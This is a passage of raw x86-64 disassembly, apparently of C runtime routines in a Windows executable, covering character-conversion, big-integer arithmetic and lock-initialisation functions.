  408c1e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  408c23:	45 89 e9             	mov    %r13d,%r9d
  408c26:	45 89 e0             	mov    %r12d,%r8d
  408c29:	e8 62 fe ff ff       	call   0x408a90
  408c2e:	85 c0                	test   %eax,%eax
  408c30:	7f ce                	jg     0x408c00
  408c32:	eb 8b                	jmp    0x408bbf
  408c34:	48 83 ee 01          	sub    $0x1,%rsi
  408c38:	eb 8c                	jmp    0x408bc6
  408c3a:	90                   	nop
  408c3b:	90                   	nop
  408c3c:	90                   	nop
  408c3d:	90                   	nop
  408c3e:	90                   	nop
  408c3f:	90                   	nop
  408c40:	56                   	push   %rsi
  408c41:	53                   	push   %rbx
  408c42:	48 83 ec 58          	sub    $0x58,%rsp
  408c46:	48 85 d2             	test   %rdx,%rdx
  408c49:	48 89 ce             	mov    %rcx,%rsi
  408c4c:	48 89 d3             	mov    %rdx,%rbx
  408c4f:	0f 84 2e 01 00 00    	je     0x408d83
  408c55:	4d 85 c0             	test   %r8,%r8
  408c58:	0f 84 32 01 00 00    	je     0x408d90
  408c5e:	0f b6 12             	movzbl (%rdx),%edx
  408c61:	41 8b 01             	mov    (%r9),%eax
  408c64:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
  408c6b:	89 44 24 40          	mov    %eax,0x40(%rsp)
  408c6f:	84 d2                	test   %dl,%dl
  408c71:	0f 84 a9 00 00 00    	je     0x408d20
  408c77:	83 bc 24 98 00 00 00 	cmpl   $0x1,0x98(%rsp)
  408c7e:	01 
  408c7f:	76 7f                	jbe    0x408d00
  408c81:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
  408c86:	0f 85 a4 00 00 00    	jne    0x408d30
  408c8c:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
  408c91:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
  408c96:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
  408c9d:	ff 15 5d 59 0d 00    	call   *0xd595d(%rip)        # 0x4de600
  408ca3:	85 c0                	test   %eax,%eax
  408ca5:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  408caa:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
  408caf:	74 4f                	je     0x408d00
  408cb1:	49 83 f8 01          	cmp    $0x1,%r8
  408cb5:	0f 86 f1 00 00 00    	jbe    0x408dac
  408cbb:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
  408cc2:	00 
  408cc3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
  408cc8:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  408cce:	49 89 d8             	mov    %rbx,%r8
  408cd1:	ba 08 00 00 00       	mov    $0x8,%edx
  408cd6:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
  408cdd:	ff 15 3d 59 0d 00    	call   *0xd593d(%rip)        # 0x4de620
  408ce3:	85 c0                	test   %eax,%eax
  408ce5:	0f 84 ac 00 00 00    	je     0x408d97
  408ceb:	b8 02 00 00 00       	mov    $0x2,%eax
  408cf0:	48 83 c4 58          	add    $0x58,%rsp
  408cf4:	5b                   	pop    %rbx
  408cf5:	5e                   	pop    %rsi
  408cf6:	c3                   	ret
  408cf7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  408cfe:	00 00 
  408d00:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
  408d07:	85 c0                	test   %eax,%eax
  408d09:	75 45                	jne    0x408d50
  408d0b:	0f b6 03             	movzbl (%rbx),%eax
  408d0e:	66 89 06             	mov    %ax,(%rsi)
  408d11:	b8 01 00 00 00       	mov    $0x1,%eax
  408d16:	48 83 c4 58          	add    $0x58,%rsp
  408d1a:	5b                   	pop    %rbx
  408d1b:	5e                   	pop    %rsi
  408d1c:	c3                   	ret
  408d1d:	0f 1f 00             	nopl   (%rax)
  408d20:	66 c7 01 00 00       	movw   $0x0,(%rcx)
  408d25:	31 c0                	xor    %eax,%eax
  408d27:	48 83 c4 58          	add    $0x58,%rsp
  408d2b:	5b                   	pop    %rbx
  408d2c:	5e                   	pop    %rsi
  408d2d:	c3                   	ret
  408d2e:	66 90                	xchg   %ax,%ax
  408d30:	88 54 24 41          	mov    %dl,0x41(%rsp)
  408d34:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
  408d3b:	00 
  408d3c:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  408d42:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  408d47:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
  408d4c:	eb 83                	jmp    0x408cd1
  408d4e:	66 90                	xchg   %ax,%ax
  408d50:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
  408d57:	00 
  408d58:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
  408d5d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  408d63:	49 89 d8             	mov    %rbx,%r8
  408d66:	ba 08 00 00 00       	mov    $0x8,%edx
  408d6b:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
  408d72:	ff 15 a8 58 0d 00    	call   *0xd58a8(%rip)        # 0x4de620
  408d78:	85 c0                	test   %eax,%eax
  408d7a:	74 1b                	je     0x408d97
  408d7c:	b8 01 00 00 00       	mov    $0x1,%eax
  408d81:	eb a4                	jmp    0x408d27
  408d83:	31 c0                	xor    %eax,%eax
  408d85:	48 83 c4 58          	add    $0x58,%rsp
  408d89:	5b                   	pop    %rbx
  408d8a:	5e                   	pop    %rsi
  408d8b:	c3                   	ret
  408d8c:	0f 1f 40 00          	nopl   0x0(%rax)
  408d90:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  408d95:	eb 90                	jmp    0x408d27
  408d97:	e8 d4 12 00 00       	call   0x40a070
  408d9c:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
  408da2:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  408da7:	e9 7b ff ff ff       	jmp    0x408d27
  408dac:	0f b6 03             	movzbl (%rbx),%eax
  408daf:	41 88 01             	mov    %al,(%r9)
  408db2:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  408db7:	e9 6b ff ff ff       	jmp    0x408d27
  408dbc:	0f 1f 40 00          	nopl   0x0(%rax)
  408dc0:	55                   	push   %rbp
  408dc1:	57                   	push   %rdi
  408dc2:	56                   	push   %rsi
  408dc3:	53                   	push   %rbx
  408dc4:	48 83 ec 58          	sub    $0x58,%rsp
  408dc8:	48 8b 05 11 59 0d 00 	mov    0xd5911(%rip),%rax        # 0x4de6e0
  408dcf:	48 8d 5c 24 4e       	lea    0x4e(%rsp),%rbx
  408dd4:	48 85 c9             	test   %rcx,%rcx
  408dd7:	4c 89 ce             	mov    %r9,%rsi
  408dda:	48 89 d7             	mov    %rdx,%rdi
  408ddd:	66 c7 44 24 4e 00 00 	movw   $0x0,0x4e(%rsp)
  408de4:	8b 28                	mov    (%rax),%ebp
  408de6:	48 0f 45 d9          	cmovne %rcx,%rbx
  408dea:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
  408def:	ff 15 5b 01 0d 00    	call   *0xd015b(%rip)        # 0x4d8f50
  408df5:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  408dfa:	4c 8d 0d af 3b 0d 00 	lea    0xd3baf(%rip),%r9        # 0x4dc9b0
  408e01:	48 85 f6             	test   %rsi,%rsi
  408e04:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
  408e08:	89 44 24 20          	mov    %eax,0x20(%rsp)
  408e0c:	48 89 fa             	mov    %rdi,%rdx
  408e0f:	4c 0f 45 ce          	cmovne %rsi,%r9
  408e13:	48 89 d9             	mov    %rbx,%rcx
  408e16:	e8 25 fe ff ff       	call   0x408c40
  408e1b:	48 98                	cltq
  408e1d:	48 83 c4 58          	add    $0x58,%rsp
  408e21:	5b                   	pop    %rbx
  408e22:	5e                   	pop    %rsi
  408e23:	5f                   	pop    %rdi
  408e24:	5d                   	pop    %rbp
  408e25:	c3                   	ret
  408e26:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  408e2d:	00 00 00 
  408e30:	41 56                	push   %r14
  408e32:	41 55                	push   %r13
  408e34:	41 54                	push   %r12
  408e36:	55                   	push   %rbp
  408e37:	57                   	push   %rdi
  408e38:	56                   	push   %rsi
  408e39:	53                   	push   %rbx
  408e3a:	48 83 ec 40          	sub    $0x40,%rsp
  408e3e:	48 8d 2d 6f 3b 0d 00 	lea    0xd3b6f(%rip),%rbp        # 0x4dc9b4
  408e45:	4d 85 c9             	test   %r9,%r9
  408e48:	49 89 d6             	mov    %rdx,%r14
  408e4b:	48 89 ce             	mov    %rcx,%rsi
  408e4e:	49 0f 45 e9          	cmovne %r9,%rbp
  408e52:	4c 89 c7             	mov    %r8,%rdi
  408e55:	ff 15 f5 00 0d 00    	call   *0xd00f5(%rip)        # 0x4d8f50
  408e5b:	41 89 c5             	mov    %eax,%r13d
  408e5e:	48 8b 05 7b 58 0d 00 	mov    0xd587b(%rip),%rax        # 0x4de6e0
  408e65:	4d 85 f6             	test   %r14,%r14
  408e68:	44 8b 20             	mov    (%rax),%r12d
  408e6b:	74 73                	je     0x408ee0
  408e6d:	49 8b 16             	mov    (%r14),%rdx
  408e70:	48 85 d2             	test   %rdx,%rdx
  408e73:	74 6b                	je     0x408ee0
  408e75:	48 85 f6             	test   %rsi,%rsi
  408e78:	74 6a                	je     0x408ee4
  408e7a:	31 db                	xor    %ebx,%ebx
  408e7c:	48 85 ff             	test   %rdi,%rdi
  408e7f:	75 1a                	jne    0x408e9b
  408e81:	eb 49                	jmp    0x408ecc
  408e83:	49 8b 16             	mov    (%r14),%rdx
  408e86:	48 63 c1             	movslq %ecx,%rax
  408e89:	48 83 c6 02          	add    $0x2,%rsi
  408e8d:	48 01 c3             	add    %rax,%rbx
  408e90:	48 01 c2             	add    %rax,%rdx
  408e93:	48 39 df             	cmp    %rbx,%rdi
  408e96:	49 89 16             	mov    %rdx,(%r14)
  408e99:	76 21                	jbe    0x408ebc
  408e9b:	49 89 f8             	mov    %rdi,%r8
  408e9e:	48 89 f1             	mov    %rsi,%rcx
  408ea1:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  408ea6:	49 29 d8             	sub    %rbx,%r8
  408ea9:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
  408eae:	49 89 e9             	mov    %rbp,%r9
  408eb1:	e8 8a fd ff ff       	call   0x408c40
  408eb6:	85 c0                	test   %eax,%eax
  408eb8:	89 c1                	mov    %eax,%ecx
  408eba:	7f c7                	jg     0x408e83
  408ebc:	85 c9                	test   %ecx,%ecx
  408ebe:	75 0c                	jne    0x408ecc
  408ec0:	48 39 fb             	cmp    %rdi,%rbx
  408ec3:	73 07                	jae    0x408ecc
  408ec5:	49 c7 06 00 00 00 00 	movq   $0x0,(%r14)
  408ecc:	48 89 d8             	mov    %rbx,%rax
  408ecf:	48 83 c4 40          	add    $0x40,%rsp
  408ed3:	5b                   	pop    %rbx
  408ed4:	5e                   	pop    %rsi
  408ed5:	5f                   	pop    %rdi
  408ed6:	5d                   	pop    %rbp
  408ed7:	41 5c                	pop    %r12
  408ed9:	41 5d                	pop    %r13
  408edb:	41 5e                	pop    %r14
  408edd:	c3                   	ret
  408ede:	66 90                	xchg   %ax,%ax
  408ee0:	31 db                	xor    %ebx,%ebx
  408ee2:	eb e8                	jmp    0x408ecc
  408ee4:	48 85 ff             	test   %rdi,%rdi
  408ee7:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
  408eee:	74 f0                	je     0x408ee0
  408ef0:	44 89 e6             	mov    %r12d,%esi
  408ef3:	31 db                	xor    %ebx,%ebx
  408ef5:	eb 1c                	jmp    0x408f13
  408ef7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  408efe:	00 00 
  408f00:	49 8b 16             	mov    (%r14),%rdx
  408f03:	48 98                	cltq
  408f05:	48 01 c3             	add    %rax,%rbx
  408f08:	48 01 c2             	add    %rax,%rdx
  408f0b:	48 39 df             	cmp    %rbx,%rdi
  408f0e:	49 89 16             	mov    %rdx,(%r14)
  408f11:	76 b9                	jbe    0x408ecc
  408f13:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
  408f18:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  408f1d:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
  408f22:	49 89 e9             	mov    %rbp,%r9
  408f25:	49 89 f0             	mov    %rsi,%r8
  408f28:	e8 13 fd ff ff       	call   0x408c40
  408f2d:	85 c0                	test   %eax,%eax
  408f2f:	7f cf                	jg     0x408f00
  408f31:	eb 99                	jmp    0x408ecc
  408f33:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  408f3a:	84 00 00 00 00 00 
  408f40:	55                   	push   %rbp
  408f41:	57                   	push   %rdi
  408f42:	56                   	push   %rsi
  408f43:	53                   	push   %rbx
  408f44:	48 83 ec 48          	sub    $0x48,%rsp
  408f48:	48 8b 05 91 57 0d 00 	mov    0xd5791(%rip),%rax        # 0x4de6e0
  408f4f:	48 89 ce             	mov    %rcx,%rsi
  408f52:	48 89 d7             	mov    %rdx,%rdi
  408f55:	4c 89 c3             	mov    %r8,%rbx
  408f58:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
  408f5f:	8b 28                	mov    (%rax),%ebp
  408f61:	ff 15 e9 ff 0c 00    	call   *0xcffe9(%rip)        # 0x4d8f50
  408f67:	48 8d 15 4a 3a 0d 00 	lea    0xd3a4a(%rip),%rdx        # 0x4dc9b8
  408f6e:	48 85 db             	test   %rbx,%rbx
  408f71:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
  408f76:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
  408f7a:	89 44 24 20          	mov    %eax,0x20(%rsp)
  408f7e:	49 89 f8             	mov    %rdi,%r8
  408f81:	48 0f 44 da          	cmove  %rdx,%rbx
  408f85:	48 89 f2             	mov    %rsi,%rdx
  408f88:	49 89 d9             	mov    %rbx,%r9
  408f8b:	e8 b0 fc ff ff       	call   0x408c40
  408f90:	48 98                	cltq
  408f92:	48 83 c4 48          	add    $0x48,%rsp
  408f96:	5b                   	pop    %rbx
  408f97:	5e                   	pop    %rsi
  408f98:	5f                   	pop    %rdi
  408f99:	5d                   	pop    %rbp
  408f9a:	c3                   	ret
  408f9b:	90                   	nop
  408f9c:	90                   	nop
  408f9d:	90                   	nop
  408f9e:	90                   	nop
  408f9f:	90                   	nop
  408fa0:	53                   	push   %rbx
  408fa1:	48 83 ec 20          	sub    $0x20,%rsp
  408fa5:	31 db                	xor    %ebx,%ebx
  408fa7:	83 f9 1b             	cmp    $0x1b,%ecx
  408faa:	7e 11                	jle    0x408fbd
  408fac:	b8 04 00 00 00       	mov    $0x4,%eax
  408fb1:	01 c0                	add    %eax,%eax
  408fb3:	83 c3 01             	add    $0x1,%ebx
  408fb6:	8d 50 17             	lea    0x17(%rax),%edx
  408fb9:	39 ca                	cmp    %ecx,%edx
  408fbb:	7c f4                	jl     0x408fb1
  408fbd:	89 d9                	mov    %ebx,%ecx
  408fbf:	e8 2c 04 00 00       	call   0x4093f0
  408fc4:	89 18                	mov    %ebx,(%rax)
  408fc6:	48 83 c0 04          	add    $0x4,%rax
  408fca:	48 83 c4 20          	add    $0x20,%rsp
  408fce:	5b                   	pop    %rbx
  408fcf:	c3                   	ret
  408fd0:	56                   	push   %rsi
  408fd1:	53                   	push   %rbx
  408fd2:	48 83 ec 28          	sub    $0x28,%rsp
  408fd6:	48 89 cb             	mov    %rcx,%rbx
  408fd9:	44 89 c1             	mov    %r8d,%ecx
  408fdc:	48 89 d6             	mov    %rdx,%rsi
  408fdf:	e8 bc ff ff ff       	call   0x408fa0
  408fe4:	44 0f b6 03          	movzbl (%rbx),%r8d
  408fe8:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
  408fec:	45 84 c0             	test   %r8b,%r8b
  408fef:	44 88 00             	mov    %r8b,(%rax)
  408ff2:	49 89 c0             	mov    %rax,%r8
  408ff5:	74 1d                	je     0x409014
  408ff7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  408ffe:	00 00 
  409000:	44 0f b6 09          	movzbl (%rcx),%r9d
  409004:	49 83 c0 01          	add    $0x1,%r8
  409008:	48 83 c1 01          	add    $0x1,%rcx
  40900c:	45 84 c9             	test   %r9b,%r9b
  40900f:	45 88 08             	mov    %r9b,(%r8)
  409012:	75 ec                	jne    0x409000
  409014:	48 85 f6             	test   %rsi,%rsi
  409017:	74 03                	je     0x40901c
  409019:	4c 89 06             	mov    %r8,(%rsi)
  40901c:	48 83 c4 28          	add    $0x28,%rsp
  409020:	5b                   	pop    %rbx
  409021:	5e                   	pop    %rsi
  409022:	c3                   	ret
  409023:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40902a:	84 00 00 00 00 00 
  409030:	ba 01 00 00 00       	mov    $0x1,%edx
  409035:	48 89 c8             	mov    %rcx,%rax
  409038:	8b 49 fc             	mov    -0x4(%rcx),%ecx
  40903b:	d3 e2                	shl    %cl,%edx
  40903d:	89 48 04             	mov    %ecx,0x4(%rax)
  409040:	48 8d 48 fc          	lea    -0x4(%rax),%rcx
  409044:	89 50 08             	mov    %edx,0x8(%rax)
  409047:	e9 84 04 00 00       	jmp    0x4094d0
  40904c:	0f 1f 40 00          	nopl   0x0(%rax)
  409050:	41 57                	push   %r15
  409052:	41 56                	push   %r14
  409054:	41 55                	push   %r13
  409056:	41 54                	push   %r12
  409058:	55                   	push   %rbp
  409059:	57                   	push   %rdi
  40905a:	56                   	push   %rsi
  40905b:	53                   	push   %rbx
  40905c:	48 83 ec 38          	sub    $0x38,%rsp
  409060:	31 c0                	xor    %eax,%eax
  409062:	8b 72 14             	mov    0x14(%rdx),%esi
  409065:	49 89 cd             	mov    %rcx,%r13
  409068:	48 89 d1             	mov    %rdx,%rcx
  40906b:	41 3b 75 14          	cmp    0x14(%r13),%esi
  40906f:	0f 8f 4a 01 00 00    	jg     0x4091bf
  409075:	83 ee 01             	sub    $0x1,%esi
  409078:	48 8d 5a 18          	lea    0x18(%rdx),%rbx
  40907c:	4d 8d 65 18          	lea    0x18(%r13),%r12
  409080:	4c 63 fe             	movslq %esi,%r15
  409083:	49 83 c7 04          	add    $0x4,%r15
  409087:	46 8b 44 ba 08       	mov    0x8(%rdx,%r15,4),%r8d
  40908c:	43 8b 44 bd 08       	mov    0x8(%r13,%r15,4),%eax
  409091:	4a 8d 6c ba 08       	lea    0x8(%rdx,%r15,4),%rbp
  409096:	31 d2                	xor    %edx,%edx
  409098:	41 83 c0 01          	add    $0x1,%r8d
  40909c:	41 f7 f0             	div    %r8d
  40909f:	85 c0                	test   %eax,%eax
  4090a1:	41 89 c6             	mov    %eax,%r14d
  4090a4:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
  4090a8:	0f 84 8a 00 00 00    	je     0x409138
  4090ae:	89 c2                	mov    %eax,%edx
  4090b0:	49 89 db             	mov    %rbx,%r11
  4090b3:	4d 89 e2             	mov    %r12,%r10
  4090b6:	31 c0                	xor    %eax,%eax
  4090b8:	45 31 c9             	xor    %r9d,%r9d
  4090bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4090c0:	45 8b 03             	mov    (%r11),%r8d
  4090c3:	49 83 c3 04          	add    $0x4,%r11
  4090c7:	4c 0f af c2          	imul   %rdx,%r8
  4090cb:	4a 8d 3c 00          	lea    (%rax,%r8,1),%rdi
  4090cf:	45 8b 02             	mov    (%r10),%r8d
  4090d2:	48 89 f8             	mov    %rdi,%rax
  4090d5:	83 e7 ff             	and    $0xffffffff,%edi
  4090d8:	48 c1 e8 20          	shr    $0x20,%rax
  4090dc:	49 29 f8             	sub    %rdi,%r8
  4090df:	4d 29 c8             	sub    %r9,%r8
  4090e2:	4d 89 c1             	mov    %r8,%r9
  4090e5:	45 89 02             	mov    %r8d,(%r10)
  4090e8:	49 83 c2 04          	add    $0x4,%r10
  4090ec:	49 c1 e9 20          	shr    $0x20,%r9
  4090f0:	41 83 e1 01          	and    $0x1,%r9d
  4090f4:	4c 39 dd             	cmp    %r11,%rbp
  4090f7:	73 c7                	jae    0x4090c0
  4090f9:	47 8b 5c bd 08       	mov    0x8(%r13,%r15,4),%r11d
  4090fe:	45 85 db             	test   %r11d,%r11d
  409101:	75 35                	jne    0x409138
  409103:	4b 8d 44 bd 00       	lea    0x0(%r13,%r15,4),%rax
  409108:	48 8d 50 08          	lea    0x8(%rax),%rdx
  40910c:	48 83 c0 04          	add    $0x4,%rax
  409110:	49 39 c4             	cmp    %rax,%r12
  409113:	73 1f                	jae    0x409134
  409115:	44 8b 52 fc          	mov    -0x4(%rdx),%r10d
  409119:	45 85 d2             	test   %r10d,%r10d
  40911c:	74 0a                	je     0x409128
  40911e:	eb 14                	jmp    0x409134
  409120:	44 8b 08             	mov    (%rax),%r9d
  409123:	45 85 c9             	test   %r9d,%r9d
  409126:	75 0c                	jne    0x409134
  409128:	48 83 e8 04          	sub    $0x4,%rax
  40912c:	83 ee 01             	sub    $0x1,%esi
  40912f:	49 39 c4             	cmp    %rax,%r12
  409132:	72 ec                	jb     0x409120
  409134:	41 89 75 14          	mov    %esi,0x14(%r13)
  409138:	48 89 ca             	mov    %rcx,%rdx
  40913b:	4c 89 e9             	mov    %r13,%rcx
  40913e:	e8 2d 08 00 00       	call   0x409970
  409143:	85 c0                	test   %eax,%eax
  409145:	78 74                	js     0x4091bb
  409147:	41 83 c6 01          	add    $0x1,%r14d
  40914b:	4c 89 e1             	mov    %r12,%rcx
  40914e:	31 d2                	xor    %edx,%edx
  409150:	44 89 74 24 2c       	mov    %r14d,0x2c(%rsp)
  409155:	44 8b 03             	mov    (%rbx),%r8d
  409158:	8b 01                	mov    (%rcx),%eax
  40915a:	48 83 c3 04          	add    $0x4,%rbx
  40915e:	4c 29 c0             	sub    %r8,%rax
  409161:	48 29 d0             	sub    %rdx,%rax
  409164:	48 89 c2             	mov    %rax,%rdx
  409167:	89 01                	mov    %eax,(%rcx)
  409169:	48 83 c1 04          	add    $0x4,%rcx
  40916d:	48 c1 ea 20          	shr    $0x20,%rdx
  409171:	83 e2 01             	and    $0x1,%edx
  409174:	48 39 dd             	cmp    %rbx,%rbp
  409177:	73 dc                	jae    0x409155
  409179:	48 63 c6             	movslq %esi,%rax
  40917c:	48 83 c0 04          	add    $0x4,%rax
  409180:	45 8b 44 85 08       	mov    0x8(%r13,%rax,4),%r8d
  409185:	45 85 c0             	test   %r8d,%r8d
  409188:	75 31                	jne    0x4091bb
  40918a:	49 8d 44 85 00       	lea    0x0(%r13,%rax,4),%rax
  40918f:	48 8d 50 08          	lea    0x8(%rax),%rdx
  409193:	48 83 c0 04          	add    $0x4,%rax
  409197:	49 39 c4             	cmp    %rax,%r12
  40919a:	73 1b                	jae    0x4091b7
  40919c:	8b 4a fc             	mov    -0x4(%rdx),%ecx
  40919f:	85 c9                	test   %ecx,%ecx
  4091a1:	74 08                	je     0x4091ab
  4091a3:	eb 12                	jmp    0x4091b7
  4091a5:	8b 10                	mov    (%rax),%edx
  4091a7:	85 d2                	test   %edx,%edx
  4091a9:	75 0c                	jne    0x4091b7
  4091ab:	48 83 e8 04          	sub    $0x4,%rax
  4091af:	83 ee 01             	sub    $0x1,%esi
  4091b2:	49 39 c4             	cmp    %rax,%r12
  4091b5:	72 ee                	jb     0x4091a5
  4091b7:	41 89 75 14          	mov    %esi,0x14(%r13)
  4091bb:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
  4091bf:	48 83 c4 38          	add    $0x38,%rsp
  4091c3:	5b                   	pop    %rbx
  4091c4:	5e                   	pop    %rsi
  4091c5:	5f                   	pop    %rdi
  4091c6:	5d                   	pop    %rbp
  4091c7:	41 5c                	pop    %r12
  4091c9:	41 5d                	pop    %r13
  4091cb:	41 5e                	pop    %r14
  4091cd:	41 5f                	pop    %r15
  4091cf:	c3                   	ret
  4091d0:	56                   	push   %rsi
  4091d1:	53                   	push   %rbx
  4091d2:	48 83 ec 28          	sub    $0x28,%rsp
  4091d6:	8b 05 54 fd 0c 00    	mov    0xcfd54(%rip),%eax        # 0x4d8f30
  4091dc:	8b 1d de 37 0d 00    	mov    0xd37de(%rip),%ebx        # 0x4dc9c0
  4091e2:	89 ce                	mov    %ecx,%esi
  4091e4:	85 c0                	test   %eax,%eax
  4091e6:	75 18                	jne    0x409200
  4091e8:	89 d8                	mov    %ebx,%eax
  4091ea:	89 35 d0 37 0d 00    	mov    %esi,0xd37d0(%rip)        # 0x4dc9c0
  4091f0:	48 83 c4 28          	add    $0x28,%rsp
  4091f4:	5b                   	pop    %rbx
  4091f5:	5e                   	pop    %rsi
  4091f6:	c3                   	ret
  4091f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4091fe:	00 00 
  409200:	e8 7b ba ff ff       	call   0x404c80
  409205:	48 8d 15 d4 08 0d 00 	lea    0xd08d4(%rip),%rdx        # 0x4d9ae0
  40920c:	48 89 c1             	mov    %rax,%rcx
  40920f:	ff 15 b3 53 0d 00    	call   *0xd53b3(%rip)        # 0x4de5c8
  409215:	48 85 c0             	test   %rax,%rax
  409218:	74 26                	je     0x409240
  40921a:	89 f1                	mov    %esi,%ecx
  40921c:	ff d0                	call   *%rax
  40921e:	89 05 9c 37 0d 00    	mov    %eax,0xd379c(%rip)        # 0x4dc9c0
  409224:	89 d8                	mov    %ebx,%eax
  409226:	c7 05 00 fd 0c 00 01 	movl   $0x1,0xcfd00(%rip)        # 0x4d8f30
  40922d:	00 00 00 
  409230:	48 83 c4 28          	add    $0x28,%rsp
  409234:	5b                   	pop    %rbx
  409235:	5e                   	pop    %rsi
  409236:	c3                   	ret
  409237:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40923e:	00 00 
  409240:	c7 05 e6 fc 0c 00 00 	movl   $0x0,0xcfce6(%rip)        # 0x4d8f30
  409247:	00 00 00 
  40924a:	eb 9c                	jmp    0x4091e8
  40924c:	0f 1f 40 00          	nopl   0x0(%rax)
  409250:	48 83 ec 28          	sub    $0x28,%rsp
  409254:	8b 15 da fc 0c 00    	mov    0xcfcda(%rip),%edx        # 0x4d8f34
  40925a:	85 d2                	test   %edx,%edx
  40925c:	75 12                	jne    0x409270
  40925e:	8b 05 5c 37 0d 00    	mov    0xd375c(%rip),%eax        # 0x4dc9c0
  409264:	48 83 c4 28          	add    $0x28,%rsp
  409268:	c3                   	ret
  409269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  409270:	e8 0b ba ff ff       	call   0x404c80
  409275:	48 8d 15 77 08 0d 00 	lea    0xd0877(%rip),%rdx        # 0x4d9af3
  40927c:	48 89 c1             	mov    %rax,%rcx
  40927f:	ff 15 43 53 0d 00    	call   *0xd5343(%rip)        # 0x4de5c8
  409285:	48 85 c0             	test   %rax,%rax
  409288:	74 18                	je     0x4092a2
  40928a:	ff d0                	call   *%rax
  40928c:	ba 01 00 00 00       	mov    $0x1,%edx
  409291:	89 05 29 37 0d 00    	mov    %eax,0xd3729(%rip)        # 0x4dc9c0
  409297:	89 15 97 fc 0c 00    	mov    %edx,0xcfc97(%rip)        # 0x4d8f34
  40929d:	48 83 c4 28          	add    $0x28,%rsp
  4092a1:	c3                   	ret
  4092a2:	8b 05 18 37 0d 00    	mov    0xd3718(%rip),%eax        # 0x4dc9c0
  4092a8:	31 d2                	xor    %edx,%edx
  4092aa:	eb eb                	jmp    0x409297
  4092ac:	90                   	nop
  4092ad:	90                   	nop
  4092ae:	90                   	nop
  4092af:	90                   	nop
  4092b0:	56                   	push   %rsi
  4092b1:	53                   	push   %rbx
  4092b2:	48 83 ec 28          	sub    $0x28,%rsp
  4092b6:	8b 05 84 40 0d 00    	mov    0xd4084(%rip),%eax        # 0x4dd340
  4092bc:	48 63 f1             	movslq %ecx,%rsi
  4092bf:	83 f8 02             	cmp    $0x2,%eax
  4092c2:	74 40                	je     0x409304
  4092c4:	85 c0                	test   %eax,%eax
  4092c6:	75 66                	jne    0x40932e
  4092c8:	b0 01                	mov    $0x1,%al
  4092ca:	f0 87 05 6f 40 0d 00 	lock xchg %eax,0xd406f(%rip)        # 0x4dd340
  4092d1:	85 c0                	test   %eax,%eax
  4092d3:	75 4e                	jne    0x409323
  4092d5:	48 8d 0d 84 40 0d 00 	lea    0xd4084(%rip),%rcx        # 0x4dd360
  4092dc:	48 8b 1d 15 53 0d 00 	mov    0xd5315(%rip),%rbx        # 0x4de5f8
  4092e3:	ff d3                	call   *%rbx
  4092e5:	48 8d 0d 9c 40 0d 00 	lea    0xd409c(%rip),%rcx        # 0x4dd388
  4092ec:	ff d3                	call   *%rbx
  4092ee:	48 8d 0d ab 00 00 00 	lea    0xab(%rip),%rcx        # 0x4093a0
  4092f5:	e8 06 ab ff ff       	call   0x403e00
  4092fa:	c7 05 3c 40 0d 00 02 	movl   $0x2,0xd403c(%rip)        # 0x4dd340
  409301:	00 00 00 
  409304:	48 8d 14 b6          	lea    (%rsi,%rsi,4),%rdx
  409308:	48 8d 05 51 40 0d 00 	lea    0xd4051(%rip),%rax        # 0x4dd360
  40930f:	48 8d 0c d0          	lea    (%rax,%rdx,8),%rcx
  409313:	48 8b 05 5e 52 0d 00 	mov    0xd525e(%rip),%rax        # 0x4de578
  40931a:	48 83 c4 28          	add    $0x28,%rsp
  40931e:	5b                   	pop    %rbx
  40931f:	5e                   	pop    %rsi
